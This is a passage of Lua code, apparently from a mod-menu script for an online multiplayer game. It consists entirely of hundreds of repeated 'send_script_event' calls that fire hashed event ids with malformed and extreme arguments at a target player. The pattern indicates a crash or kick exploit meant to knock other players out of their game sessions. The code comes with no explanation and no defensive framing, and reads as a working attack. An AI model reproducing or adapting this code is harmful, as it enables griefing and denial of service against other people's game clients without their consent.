        send_script_event(767605081, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(767605081, pid, {0, 0, 46190868, 0, 2})
        send_script_event(767605081, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(767605081, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(767605081, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(767605081, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(767605081, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(767605081, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(767605081, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            767605081,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            767605081,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            767605081,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165})
        send_script_event(-1949011582, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1949011582, pid, {-1, 0})
        send_script_event(
            -1949011582,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1949011582, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1949011582, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1949011582, pid, {-1, 0})
        send_script_event(-1949011582, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1949011582, pid, {-1, 0})
        send_script_event(-1949011582, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1949011582, pid, {-1, 0})
        send_script_event(-1949011582, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1949011582, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {1, 0})
        send_script_event(-1949011582, pid, {0, -1})
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1949011582,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1949011582, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1949011582, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1949011582, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1949011582, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1949011582, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1949011582, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1949011582, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1949011582, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1949011582, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1949011582, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1949011582, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1949011582, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1949011582, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1949011582, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1949011582,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1949011582,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1949011582,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(
            -2122716210,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-2122716210, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {0, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-2122716210, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-2122716210, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-2122716210, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-2122716210, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2122716210, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2122716210, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2122716210, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2122716210, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -2122716210,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165})
        send_script_event(-922075519, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-922075519, pid, {-1, 0})
        send_script_event(
            -922075519,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-922075519, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-922075519, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-922075519, pid, {-1, 0})
        send_script_event(-922075519, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-922075519, pid, {-1, 0})
        send_script_event(-922075519, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-922075519, pid, {-1, 0})
        send_script_event(-922075519, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-922075519, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {1, 0})
        send_script_event(-922075519, pid, {0, -1})
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -922075519,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-922075519, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-922075519, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-922075519, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-922075519, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-922075519, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-922075519, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-922075519, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-922075519, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-922075519, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-922075519, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-922075519, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-922075519, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-922075519, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-922075519, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -922075519,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -922075519,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -922075519,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165})
        util.yield(1)
        send_script_event(-1975590661, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1975590661,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1975590661, pid, {-1, 0})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(1882923979, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x2DC0B959, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8BD47182, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1139568479, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8179EBCE, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xC90A3E81, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8A3EE0FB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1730227041, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(526625102, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1347850743, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-799924696, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(2646045593, pid, {-1, 0, -1, 0})
        send_script_event(1347850743, pid, {-1, 0, -1, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3317451851, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            -1975590661,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            -922075519,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-452918768, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-966559987, pid, {pid, 532165, pid})
        send_script_event(733106126, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-442306200, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(1881968783, pid, {pid, 532165, pid})
        send_script_event(-1729804184, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(2099816323, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1256990787, pid, {pid, 532165, pid})
        send_script_event(121406262, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165})
        send_script_event(1070934291, pid, {pid, -1, -1, -1, -1})
        send_script_event(435067392, pid, {pid, 532165, pid})
        send_script_event(171207973, pid, {pid, 532165, pid})
        send_script_event(1212832151, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1054826273, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1491386500, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(720040631, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(87967637, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(80053711, pid, {pid, 532165, pid})
        send_script_event(78045655, pid, {pid, 532165, pid})
        util.yield(1)
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(78686524, pid, {pid, 532165, pid})
        send_script_event(46044922, pid, {pid, 532165, pid})
        send_script_event(22412109, pid, {pid, 532165, pid})
        send_script_event(29388428, pid, {pid, 532165, pid})
        send_script_event(56335450, pid, {pid, 532165, pid})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-171207973, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-171207973, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-171207973, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-171207973, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -171207973,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(
            -1212832151,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1212832151, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1252906024, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165})
        send_script_event(922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(1882923979, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x2DC0B959, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8BD47182, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1139568479, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8179EBCE, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xC90A3E81, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8A3EE0FB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1730227041, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(526625102, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1347850743, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-799924696, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(2646045593, pid, {-1, 0, -1, 0})
        send_script_event(1347850743, pid, {-1, 0, -1, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
